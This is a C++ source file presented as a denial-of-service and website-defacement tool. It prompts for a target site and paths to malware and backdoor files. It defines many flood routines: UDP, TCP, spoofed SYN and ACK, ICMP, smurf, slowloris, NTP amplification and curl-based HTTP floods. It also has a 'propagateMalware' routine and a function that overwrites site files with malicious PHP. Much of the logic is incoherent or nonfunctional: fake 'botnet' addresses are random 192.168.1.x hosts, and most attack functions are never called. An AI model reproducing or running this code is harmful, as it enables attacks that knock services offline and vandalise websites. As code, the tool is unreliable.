#include <iostream>
#include <fstream>
#include <vector>
#include <cstdlib>
#include <ctime>
#include <thread>
#include <chrono>
#include <cstring>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <netinet/ip_icmp.h>
#include <sys/socket.h>
#include <csignal>

#define PACKET_SIZE 8192
#define MAX_BOTNETS 10000

using namespace std;

vector<string> botnetIPs;
int targetPort;
string targetWebsite;
string defaceHTML;
string malwarePHP;
string malwarePayload;
string malwareJS;
string malwarePython;
string backdoorPHP;

bool attackRunning = true;

unsigned short csum(unsigned short *ptr, int nbytes) {
    unsigned long sum;
    unsigned short oddbyte;
    unsigned short answer;

    sum = 0;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        oddbyte = 0;
        *((u_char*)&oddbyte) = *(u_char*)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum = sum + (sum >> 16);
    answer = (unsigned short)~sum;

    return answer;
}

void udpFlood(string ip, int port) {
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    sockaddr_in destAddr{};
    destAddr.sin_family = AF_INET;
    destAddr.sin_port = htons(port);
    inet_pton(AF_INET, ip.c_str(), &(destAddr.sin_addr));

    char packet[PACKET_SIZE];
    memset(packet, 'A', sizeof(packet));

    while (attackRunning) {
        sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr*)&destAddr, sizeof(destAddr));
        usleep(1); 
    }
}

void tcpFlood(string ip, int port) {
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    sockaddr_in destAddr{};
    destAddr.sin_family = AF_INET;
    destAddr.sin_port = htons(port);
    inet_pton(AF_INET, ip.c_str(), &(destAddr.sin_addr));

    while (attackRunning) {
        if (connect(sockfd, (struct sockaddr*)&destAddr, sizeof(destAddr)) == 0) {
            shutdown(sockfd, SHUT_RDWR);
            sockfd = socket(AF_INET, SOCK_STREAM, 0);
        }
        usleep(1); 
    }
}

void propagateMalware(string ip) {
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    sockaddr_in destAddr{};
    destAddr.sin_family = AF_INET;
    destAddr.sin_port = htons(80);
    inet_pton(AF_INET, ip.c_str(), &(destAddr.sin_addr));

    if (connect(sockfd, (struct sockaddr*)&destAddr, sizeof(destAddr)) == 0) {
        string request = "GET /" + targetWebsite + ".php HTTP/1.1\r\nHost: " + ip + "\r\nConnection: close\r\n\r\n";
        send(sockfd, request.c_str(), request.length(), 0);
    }
    close(sockfd);
}

void generateIPs() {
    srand(time(nullptr));

    string baseIP = "192.168.1.";
    int basePort = 5555;

    for (int i = 0; i < MAX_BOTNETS; i++) {
        int lastOctet = rand() % 254 + 1;
        string ip = baseIP + to_string(lastOctet);
        botnetIPs.push_back(ip);
    }
}

void startAttack() {
    for (const auto& ip : botnetIPs) {
        thread(udpFlood, ip, targetPort).detach();
        thread(tcpFlood, ip, targetPort).detach();
        thread(propagateMalware, ip).detach();
    }
}

void stopAttack(int signal) {
    attackRunning = false;
    cout << "Attack stopped by user." << endl;
    exit(0);
}

void defaceWebsite() {
    ofstream outFile(targetWebsite);
    outFile << defaceHTML;
    outFile.close();

    ofstream malwareFile(targetWebsite + ".php");
    malwareFile << malwarePHP;
    malwareFile.close();
}

string generateMalwarePayload() {
    srand(time(nullptr));
    string payload;

    for (int i = 0; i < PACKET_SIZE; i++) {
        char randomChar = rand() % 256;
        payload += randomChar;
    }

    return payload;
}

void synFlood(string ip, int port) {
    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    sockaddr_in destAddr{};
    destAddr.sin_family = AF_INET;
    destAddr.sin_port = htons(port);
    inet_pton(AF_INET, ip.c_str(), &(destAddr.sin_addr));

    char packet[PACKET_SIZE];
    memset(packet, 0, sizeof(packet));

    struct iphdr *iph = (struct iphdr*)packet;
    struct tcphdr *tcph = (struct tcphdr*)(packet + sizeof(struct iphdr));

    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
    iph->id = htons(12345);
    iph->frag_off = 0;
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0;
    iph->saddr = inet_addr("1.2.3.4");
    iph->daddr = destAddr.sin_addr.s_addr;

    tcph->source = htons(12345);
    tcph->dest = destAddr.sin_port;
    tcph->seq = random() % 900000000 + 100000000;
    tcph->ack_seq = 0;
    tcph->doff = 5;
    tcph->syn = 1;
    tcph->window = htons(65535);
    tcph->check = 0;
    tcph->urg_ptr = 0;

    iph->check = csum((unsigned short*)packet, iph->tot_len);
    tcph->check = csum((unsigned short*)tcph, sizeof(struct tcphdr));

    while (true) {
        sendto(sockfd, packet, iph->tot_len, 0, (struct sockaddr*)&destAddr, sizeof(destAddr));
        usleep(1); 
    }
}

void httpFlood(string url) {
    while (true) {
        system(("curl -s -L -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36' -X GET '" + url + "' >/dev/null").c_str());
        usleep(1); 
    }
}

void icmpFlood(string ip) {
    while (true) {
        system(("ping -c 1 -s 65507 " + ip + " >/dev/null").c_str());
        usleep(1); 
    }
}

void ackFlood(string ip, int port) {
    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    sockaddr_in destAddr{};
    destAddr.sin_family = AF_INET;
    destAddr.sin_port = htons(port);
    inet_pton(AF_INET, ip.c_str(), &(destAddr.sin_addr));

    char packet[PACKET_SIZE];
    memset(packet, 0, sizeof(packet));

    struct iphdr *iph = (struct iphdr*)packet;
    struct tcphdr *tcph = (struct tcphdr*)(packet + sizeof(struct iphdr));

    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
    iph->id = htons(12345);
    iph->frag_off = 0;
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0;
    iph->saddr = inet_addr("1.2.3.4");
    iph->daddr = destAddr.sin_addr.s_addr;

    tcph->source = htons(12345);
    tcph->dest = destAddr.sin_port;
    tcph->seq = random() % 900000000 + 100000000;
    tcph->ack_seq = 0;
    tcph->doff = 5;
    tcph->ack = 1;
    tcph->window = htons(65535);
    tcph->check = 0;
    tcph->urg_ptr = 0;

    iph->check = csum((unsigned short*)packet, iph->tot_len);
    tcph->check = csum((unsigned short*)tcph, sizeof(struct tcphdr));

    while (true) {
        sendto(sockfd, packet, iph->tot_len, 0, (struct sockaddr*)&destAddr, sizeof(destAddr));
        usleep(1); 
    }
}

void volumetricAttack(string ip, int port) {
    int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    sockaddr_in destAddr{};
    destAddr.sin_family = AF_INET;
    destAddr.sin_port = htons(port);
    inet_pton(AF_INET, ip.c_str(), &(destAddr.sin_addr));

    char packet[PACKET_SIZE];
    memset(packet, 'A', sizeof(packet));

    while (true) {
        sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr*)&destAddr, sizeof(destAddr));
        usleep(1); 
    }
}

void smurfAttack(string ip) {
    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    sockaddr_in destAddr{};
    destAddr.sin_family = AF_INET;
    destAddr.sin_port = 0;
    inet_pton(AF_INET, ip.c_str(), &(destAddr.sin_addr));

    char packet[PACKET_SIZE];
    memset(packet, 0, sizeof(packet));

    struct icmphdr *icmph = (struct icmphdr*)packet;

    icmph->type = ICMP_ECHO;
    icmph->code = 0;
    icmph->checksum = 0;
    icmph->un.echo.id = htons(getpid());
    icmph->un.echo.sequence = 0;

    icmph->checksum = csum((unsigned short*)packet, sizeof(struct icmphdr));

    while (true) {
        sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr*)&destAddr, sizeof(destAddr));
        usleep(1); 
    }
}

void sslTlsAttack(string ip, int port) {
    int sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    sockaddr_in destAddr{};
    destAddr.sin_family = AF_INET;
    destAddr.sin_port = htons(port);
    inet_pton(AF_INET, ip.c_str(), &(destAddr.sin_addr));

    if (connect(sockfd, (struct sockaddr*)&destAddr, sizeof(destAddr)) == 0) {
        string request = "GET / HTTP/1.1\r\nHost: " + ip + "\r\nConnection: Upgrade\r\nUpgrade: TLS/1.2, HTTP/1.1\r\n\r\n";
        send(sockfd, request.c_str(), request.length(), 0);
    }
    close(sockfd);
}

void httpGetRequest(string url) {
    while (true) {
        system(("curl -s -L -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36' -X GET '" + url + "' >/dev/null").c_str());
        usleep(1); 
    }
}

void protocolAttack(string ip) {
    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_IP);
    sockaddr_in destAddr{};
    destAddr.sin_family = AF_INET;
    destAddr.sin_port = 0;
    inet_pton(AF_INET, ip.c_str(), &(destAddr.sin_addr));

    char packet[PACKET_SIZE];
    memset(packet, 0, sizeof(packet));

    while (true) {
        sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr*)&destAddr, sizeof(destAddr));
        usleep(1); 
    }
}

void ipNullAttack(string ip) {
    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    sockaddr_in destAddr{};
    destAddr.sin_family = AF_INET;
    destAddr.sin_port = 0;
    inet_pton(AF_INET, ip.c_str(), &(destAddr.sin_addr));

    char packet[PACKET_SIZE];
    memset(packet, 0, sizeof(packet));

    while (true) {
        sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr*)&destAddr, sizeof(destAddr));
        usleep(1); 
    }
}

void ntpAmplificationAttack(string ip, int port) {
    int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    sockaddr_in destAddr{};
    destAddr.sin_family = AF_INET;
    destAddr.sin_port = htons(port);
    inet_pton(AF_INET, ip.c_str(), &(destAddr.sin_addr));

    char packet[PACKET_SIZE];
    memset(packet, 0, sizeof(packet));

    struct udphdr *udph = (struct udphdr*)packet;

    udph->source = htons(port);
    udph->dest = htons(123);
    udph->len = htons(512);
    udph->check = 0;

    while (true) {
        sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr*)&destAddr, sizeof(destAddr));
        usleep(1); 
    }
}

void pingOfDeath(string ip) {
    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    sockaddr_in destAddr{};
    destAddr.sin_family = AF_INET;
    destAddr.sin_port = 0;
    inet_pton(AF_INET, ip.c_str(), &(destAddr.sin_addr));

    char packet[PACKET_SIZE];
    memset(packet, 0, sizeof(packet));

    struct icmphdr *icmph = (struct icmphdr*)packet;

    icmph->type = ICMP_ECHO;
    icmph->code = 0;
    icmph->checksum = 0;
    icmph->un.echo.id = htons(getpid());
    icmph->un.echo.sequence = 0;

    icmph->checksum = csum((unsigned short*)packet, sizeof(struct icmphdr));

    while (true) {
        sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr*)&destAddr, sizeof(destAddr));
        usleep(1); 
    }
}

void slowlorisAttack(string ip, int port) {
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    sockaddr_in destAddr{};
    destAddr.sin_family = AF_INET;
    destAddr.sin_port = htons(port);
    inet_pton(AF_INET, ip.c_str(), &(destAddr.sin_addr));

    while (true) {
        if (connect(sockfd, (struct sockaddr*)&destAddr, sizeof(destAddr)) == 0) {
            string request = "GET / HTTP/1.1\r\nHost: " + ip + "\r\nConnection: keep-alive\r\n";
            send(sockfd, request.c_str(), request.length(), 0);
            this_thread::sleep_for(chrono::seconds(10));
        }
        usleep(1); 
    }
}

void hulkFlood(string url) {
    while (true) {
        system(("python3 hulk.py -t " + url).c_str());
        usleep(1); 
    }
}

void runPythonMalware() {
    system(("python3 " + malwarePython).c_str());
}

int main() {
    cout << "Enter the target website URL: ";
    cin >> targetWebsite;

    cout << "Enter the target port: ";
    cin >> targetPort;

    cout << "Enter the path to the HTML file for defacing: ";
    cin.ignore();
    getline(cin, defaceHTML);

    cout << "Enter the path to the PHP file for the malware: ";
    getline(cin, malwarePHP);

    cout << "Enter the path to the JS file for the malware: ";
    getline(cin, malwareJS);

    cout << "Enter the path to the Python file for the malware: ";
    getline(cin, malwarePython);

    cout << "Enter the path to the backdoor PHP file: ";
    getline(cin, backdoorPHP);

    malwarePayload = generateMalwarePayload();

    generateIPs();

    cout << "Botnet IPs generated: " << botnetIPs.size() << endl;

    // Register the signal handler for stopping the attack
    signal(SIGINT, stopAttack);

    // Start the attack
    startAttack();

    // Keep the program running indefinitely
    while (true) {
        continue;
    }

    return 0;
}